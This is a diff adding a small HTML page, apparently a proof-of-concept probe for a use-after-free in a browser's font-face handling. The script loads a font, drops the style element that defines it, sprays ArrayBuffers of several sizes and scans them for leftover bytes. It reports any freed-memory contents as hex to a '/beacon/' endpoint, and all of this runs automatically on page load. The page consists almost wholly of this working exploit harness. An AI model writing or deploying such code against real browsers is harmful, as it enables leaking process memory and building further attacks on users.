@@ -1,0 +1,49 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf42</title>
+<style id="st">@font-face { font-family: sqFAM; src: local(Arial); unicode-range: U+0042; }</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var U = Date.now().toString(36);
+var SIZES = [192,224,256,320,384,512,768,1024,2048];
+var K = 8, MAP = [], fired = 0;
+function spray(){
+  MAP = [];
+  for (var si=0; si<SIZES.length; si++)
+    for (var k=0;k<K;k++){
+      var ab = new ArrayBuffer(SIZES[si]);
+      MAP.push({ size: SIZES[si], view: new Uint8Array(ab) });
+    }
+}
+function scan(tag){
+  var found = 0;
+  for (var i=0;i<MAP.length;i++){
+    var u=MAP[i].view, nz=0;
+    for (var o=0;o<u.length;o+=8){ if (u[o]||u[o+1]||u[o+2]||u[o+3]||u[o+4]||u[o+5]||u[o+6]||u[o+7]) nz++; }
+    if (nz){ found++;
+      if (found<4) b('U42-'+tag+'-HIT-s'+MAP[i].size+'-b'+i+'-nz'+nz+'-0:'+hex8(u,0)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68));
+    }
+  }
+  b('U42-'+tag+'-hits-'+found+'-of-'+MAP.length);
+}
+function run(){
+  var fam = 's'+U;
+  var st = document.getElementById('st');
+  st.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  b('U42-SETUP-'+fam);
+  /* let the engine build and load the face first */
+  document.fonts.load('1em '+fam, 'A').then(function(){
+    b('U42-LOADED');
+    /* now drop the last reference to the sheet: element removed, text cleared, var gone */
+    st.remove();
+    st.textContent = '';
+    document.body.offsetHeight;
+    spray();
+    b('U42-SPRAY-'+MAP.length);
+    setTimeout(function(){ scan('T80'); },80);
+    setTimeout(function(){ scan('T400'); },400);
+  }, function(){ b('U42-LOAD-REJECTED'); });
+}
+function go(){ setTimeout(run, 0); }
+if (document.readyState==='complete') go();
+else document.addEventListener('DOMContentLoaded', go);
+</script></head><body><p>uaf42</p></body></html>
